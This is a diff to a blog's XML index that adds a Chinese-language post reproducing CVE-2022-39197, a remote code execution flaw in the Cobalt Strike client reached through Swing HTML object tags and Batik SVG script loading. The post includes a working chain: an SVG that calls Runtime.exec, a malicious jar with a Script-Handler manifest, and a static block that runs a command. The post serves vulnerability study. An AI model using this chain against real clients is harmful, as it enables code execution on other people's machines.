@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>CVE-2022-39197 CobaltStrike RCE漏洞学习</title>
+    <link href="/2022/11/28/CVE-2022-39197-CobaltStrike-RCE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
+    <url>/2022/11/28/CVE-2022-39197-CobaltStrike-RCE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习，据说是由XSS和Swing导致的RCE漏洞。</p><a id="more"></a><hr><h3 id="Java-Swing"><a href="#Java-Swing" class="headerlink" title="Java Swing"></a>Java Swing</h3><p>可以用于构建Java的图形化界面，似乎可以通过捕获beacon，与CobaltStrike服务的交互，最后在CobaltStrike客户端渲染的方式实现RCE。</p><p>测试用代码：</p><pre><code class="java">String html = &quot;&quot; +    &quot;&lt;html&gt;&quot; +        &quot;&lt;img src=x&gt;&quot; +    &quot;&lt;/html&gt;&quot;;JFrame f = new JFrame(&quot;CVE-2022-39397&quot;);JLabel l = new JLabel(html);f.add(l);f.setSize(300, 300);f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);f.setVisible(true);</code></pre><p>可以渲染出一张图片来：</p><p><img src="/css/images/CVE-2022-39197/2022112801.png" srcset="/img/loading.gif" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>按照参考文章的说法，script之类的一些标签在Swing里面是无法加载的，所以要在Swing框架下找到新的利用方法，就像JSON/XML反序列化那样的某些危险标签或者标签里面的危险属性。</p><p>全局搜索一下HTML类，可以找到javax.swing.text.html.HTML类，可以看到里面存在一个getTag和一个getAttributeKey函数：</p><pre><code class="java">public static Tag getTag(String tagName) {    Tag t =  tagHashtable.get(tagName);    return (t == null ? null : t);}</code></pre><p>下断点后调试可以发现解析html标签和img标签时会经过这个函数，找一下这个tagHashtable表中都有什么标签，可以看到在static静态代码块里面初始化了这个表：</p><pre><code class="java">for (int i = 0; i &lt; Tag.allTags.length; i++ ) {    tagHashtable.put(Tag.allTags[i].toString(), Tag.allTags[i]);    StyleContext.registerStaticAttributeKey(Tag.allTags[i]);}</code></pre><p>找到Tag.allTags：</p><pre><code class="java">static final Tag allTags[]  = {    A, ADDRESS, APPLET, AREA, B, BASE, BASEFONT, BIG,    BLOCKQUOTE, BODY, BR, CAPTION, CENTER, CITE, CODE,    DD, DFN, DIR, DIV, DL, DT, EM, FONT, FORM, FRAME,    FRAMESET, H1, H2, H3, H4, H5, H6, HEAD, HR, HTML,    I, IMG, INPUT, ISINDEX, KBD, LI, LINK, MAP, MENU,    META, NOBR, NOFRAMES, OBJECT, OL, OPTION, P, PARAM,    PRE, SAMP, SCRIPT, SELECT, SMALL, SPAN, STRIKE, S,    STRONG, STYLE, SUB, SUP, TABLE, TD, TEXTAREA,    TH, TITLE, TR, TT, U, UL, VAR};</code></pre><p>可以看到这里有一个可疑的标签OBJECT，继续调试看看Swing怎么处理这个标签，网上追溯可以看到：</p><pre><code class="java">public TagElement (Element elem, boolean fictional) {    this.elem = elem;    htmlTag = HTML.getTag(elem.getName());    if (htmlTag == null) {        htmlTag = new HTML.UnknownTag(elem.getName());    }    insertedByErrorRecovery = fictional;}</code></pre><p>保存进一个对象里，然后再通过该对象的getHTMLTag函数返回，跟这个htmlTag相关联的还有一个elem，继续调试看看这个elem是什么：</p><p><img src="/css/images/CVE-2022-39197/2022112802.png" srcset="/img/loading.gif" alt=""></p><p>一个Element对象，但是里面没有什么特别有意思的数据。</p><p>寻思着对标签进行分别处理多半要进行标签名的判读，所以全局搜索HTML.Tag.OBJECT，找到渲染时使用的object视图类：</p><pre><code class="java">else if (kind == HTML.Tag.OBJECT) {    return new ObjectView(elem);} </code></pre><p>里面只有三个函数，其中getUnloadableRepresentation函数没有用，setParameters函数通过createComponent调用，于是给createComponent函数下一个断点，看看这个函数，前两句是：</p><pre><code class="java">AttributeSet attr = getElement().getAttributes();String classname = (String) attr.getAttribute(HTML.Attribute.CLASSID);</code></pre><p>看起来可以根据classid属性指定一个类名，修改一下输入HTML继续调试：</p><pre><code class="java">String html = &quot;&quot; +    &quot;&lt;html&gt;&quot; +        &quot;&lt;object classid=&#39;java.lang.Runtime&#39;&gt;&quot; +    &quot;&lt;/html&gt;&quot;;</code></pre><p>然后是：</p><pre><code class="java">try {    ReflectUtil.checkPackageAccess(classname);    Class c = Class.forName(classname, true,Thread.currentThread().                            getContextClassLoader());    Object o = c.newInstance();    if (o instanceof Component) {        Component comp = (Component) o;        setParameters(comp, attr);        return comp;    }} catch (Throwable e) {    // couldn&#39;t create a component... fall through to the    // couldn&#39;t load representation.}</code></pre><p>简单来说就是通过公有的无参构造函数实例化了一个对象，这里写入的Runtime类就因为没有这种构造函数失败了，这里是肯定无法利用的。另外如果输入的类名继承自Component类，则会将object标签中的数据作为该对象的属性，并通过setParameters函数进行反射写入：</p><pre><code class="java">// found a property parameterString value = (String) v;Method writer = props[i].getWriteMethod();if (writer == null) {    // read-only property. ignore    return;     // for now}Class[] params = writer.getParameterTypes();if (params.length != 1) {    // zero or more than one argument, ignore    return;     // for now}Object [] args = { value };try {    MethodUtil.invoke(writer, comp, args);} catch (Exception ex) {    System.err.println(&quot;Invocation failed&quot;);    // invocation code}</code></pre><p>以AWTAnimationPanel2类为例，setParameters函数会通过getPropertyDescriptors函数获取其所有属性，至于是getter还是真的属性另说，此时可以注意到属性的值是通过和获取classid同样的方法从标签获取的，且只支持String类型的属性：</p><pre><code class="java">Object v = attr.getAttribute(props[i].getName());if (v instanceof String) {    ...}</code></pre><p>修改一下HTML，加上name属性：</p><pre><code class="java">String html = &quot;&quot; +    &quot;&lt;html&gt;&quot; +        &quot;&lt;object classid=&#39;com.sun.deploy.uitoolkit.impl.awt.AWTAnimationPanel2&#39; name=&#39;Twings&#39;&gt;&quot; +    &quot;&lt;/html&gt;&quot;;</code></pre><p>发现这样添加的attr不是String，类型不符合导致在获取属性的时候失败：</p><pre><code class="java">Object getLocalAttribute(Object nm) {    if (nm == StyleConstants.ResolveAttribute) {        return resolveParent;    }    Object[] tbl = attributes;    for (int i = 0; i &lt; tbl.length; i += 2) {        if (nm.equals(tbl[i])) {            return tbl[i+1];        }    }    return null;}</code></pre><p>属性里不行，那应该是从HTML的更下一级标签里面找了，</p><p>在ObjectView类的注释里可以看到object标签的使用示例：</p><pre><code class="html">&lt;pre&gt;    &lt;object classid=&quot;javax.swing.JLabel&quot;&gt;        &lt;param name=&quot;text&quot; value=&quot;sample text&quot;&gt;    &lt;/object&gt;&lt;/pre&gt;</code></pre><p>很明显name代表属性名，value代表值，试一试：</p><pre><code class="java">String html = &quot;&quot; +    &quot;&lt;html&gt;&quot; +        &quot;&lt;object classid=&#39;com.sun.deploy.uitoolkit.impl.awt.AWTAnimationPanel2&#39;&gt;&quot; +            &quot;&lt;param name=&#39;name&#39; value=&#39;Twings&#39;&gt;&quot; +        &quot;&lt;/object&gt;&quot; +    &quot;&lt;/html&gt;&quot;;</code></pre><p>调试一下，可以看到反射调用setter顺利触发了：</p><p><img src="/css/images/CVE-2022-39197/2022112803.png" srcset="/img/loading.gif" alt=""></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>按照参考文章所说，利用所用的类在CobaltStrike里面，所以先下载好CobaltStrike。</p><p>随便从<a href="https://www.freebuf.com/sectool/283399.html" target="_blank" rel="noopener">freebuf</a>找了一个CobaltStrike，将cobaltstrike.jar放到项目文件夹里，并配置到项目的libraries中。</p><p>根据参考文章，利用函数为JSVGCanvas类的setURI函数：</p><pre><code class="java">public void setURI(String var1) {    String var2 = this.uri;    this.uri = var1;    if (this.uri != null) {        this.loadSVGDocument(this.uri);    } else {        this.setSVGDocument((SVGDocument)null);    }    this.pcs.firePropertyChange(&quot;URI&quot;, var2, this.uri);}</code></pre><p>是一个通过输入的URL加载SVG文件的函数。</p><p>按照参考文章，SVG文件可以执行JavaScript代码，仿写一下：</p><pre><code class="XML">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;    &lt;script&gt;        java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);    &lt;/script&gt;&lt;/svg&gt;</code></pre><p>参考文章里的写法会在DOCTYPE部分产生网络问题，这样写就行了。</p><p>然后会遇到下一个问题：</p><p><img src="/css/images/CVE-2022-39197/2022112804.png" srcset="/img/loading.gif" alt=""></p><p>看起来是由于依赖中缺失类导致的，虽然跟参考文章的缺失类不一样（大概是因为我用的是只有一个cobaltstrike.jar文件的CobaltStrike环境），根据参考文章，这一步可以通过JavaScript其他用法解决。</p><p>关注SVG所用的JavaScript解析函数BaseScriptingEnvironment类的loadScripts函数，可以看到一些有意思的东西：</p><pre><code class="java">String var24 = XLinkSupport.getXLinkHref(var5);ParsedURL var25 = new ParsedURL(var5.getBaseURI(), var24);this.checkCompatibleScriptURL(var6, var25);URL var29 = null;try {    var29 = new URL(this.docPURL.toString());} catch (MalformedURLException var18) {}DocumentJarClassLoader var26 = new DocumentJarClassLoader(new URL(var25.toString()), var29);URL var28 = var26.findResource(&quot;META-INF/MANIFEST.MF&quot;);if (var28 != null) {    Manifest var30 = new Manifest(var28.openStream());    var13 = var30.getMainAttributes().getValue(&quot;Script-Handler&quot;);    if (var13 != null) {        ScriptHandler var35 = (ScriptHandler)var26.loadClass(var13).newInstance();        ...    }}</code></pre><p>可以看到，这里根据SVG中的其他数据从一个远程URL加载了一个jar，并根据其中MANIFEST.MF文件的Script-Handler值加载并实例化了一个远程对象，很明显可以通过加载恶意static代码块的方式实现攻击。</p><p>看看要求，首先是type为application/java-archive：</p><pre><code class="java">AbstractElement var5 = (AbstractElement)var2.item(var4);String var6 = var5.getAttributeNS((String)null, &quot;type&quot;);if (var6.length() == 0) {    var6 = &quot;text/ecmascript&quot;;}String var13;if (var6.equals(&quot;application/java-archive&quot;)) {    ...}</code></pre><p>然后是URL的来源：</p><pre><code class="java">// loadScriptsString var24 = XLinkSupport.getXLinkHref(var5);ParsedURL var25 = new ParsedURL(var5.getBaseURI(), var24);// getXLinkHrefpublic static String getXLinkHref(Element var0) {    return var0.getAttributeNS(&quot;http://www.w3.org/1999/xlink&quot;, &quot;href&quot;);}</code></pre><p>先写一个恶意类：</p><pre><code class="java">package org.example;public class Evil {    static {        try {            java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);        }catch (Exception e) {            // pass        }    }}</code></pre><p>然后编译成class文件，再写一个MANIFEST.MF：</p><pre><code>Script-Handler: Evil</code></pre><p>打包：</p><pre><code class="bash">jar -cvfm Evil.jar MANIFEST.MF Evil.class</code></pre><p>然后报错了：</p><p><img src="/css/images/CVE-2022-39197/2022112805.png" srcset="/img/loading.gif" alt=""></p><p>命令行里的居然是Java 11，重新配置一下Java再试试：</p><pre><code>java.lang.NoClassDefFoundError: Evil (wrong name: org/example/Evil)</code></pre><p>改改MANIFEST.MF再来，没弹出来，再改改把package删掉：</p><pre><code class="java">public class Evil {    static {        try {            java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);        }catch (Exception e) {            // pass        }    }}</code></pre><p>尝试一下：</p><p><img src="/css/images/CVE-2022-39197/2022112806.png" srcset="/img/loading.gif" alt=""></p><p>OK了。</p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>关于类加载器，在加载FXApplet2Adapter这种类的时候：，如</p><pre><code class="java">Class.forName(&quot;com.sun.deploy.uitoolkit.impl.fx.FXApplet2Adapter&quot;);</code></pre><p>会报错：</p><pre><code>Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: com/sun/deploy/uitoolkit/Applet2Adapter</code></pre><p>原因是FXApplet2Adapter在ext/jfxrt.jar这个文件里面，而其父类Applet2Adapter在deploy.jar里面，能够加载Applet2Adapter的类加载器是用于加载FXApplet2Adapter的类加载器的父类。这就导致了FXApplet2Adapter在发现依赖于Applet2Adapter无法加载到这个类，因为它自身的类路径里没有deploy.jar，也没有父类可以委派。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ" target="_blank" rel="noopener">最新CS RCE曲折的复现路</a></p><p><a href="https://www.freebuf.com/vuls/347221.html" target="_blank" rel="noopener">最新CS RCE（CVE-2022-39197）复现心得分享</a></p><p><a href="https://github.com/its-arun/CVE-2022-39197" target="_blank" rel="noopener">CVE-2022-39197 RCE POC</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>CVE-2022-32532 Shiro认证绕过</title>
     <link href="/2022/11/24/CVE-2022-32532-Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/"/>
     <url>/2022/11/24/CVE-2022-32532-Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/</url>
@@ -387,9 +408,9 @@
       
       <tag>反序列化</tag>
       
-      <tag>JNDI</tag>
-      
       <tag>JRMP</tag>
+      
+      <tag>JNDI</tag>
       
     </tags>
     
@@ -1994,9 +2015,9 @@
       
       <tag>反序列化</tag>
       
-      <tag>JNDI</tag>
-      
       <tag>JRMP</tag>
+      
+      <tag>JNDI</tag>
       
     </tags>
     
@@ -2438,9 +2459,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -2691,9 +2712,9 @@
       
       <tag>Web</tag>
       
-      <tag>NodeJS</tag>
-      
       <tag>复现</tag>
+      
+      <tag>NodeJS</tag>
       
       <tag>前端</tag>
       
@@ -2806,9 +2827,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -2850,9 +2871,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
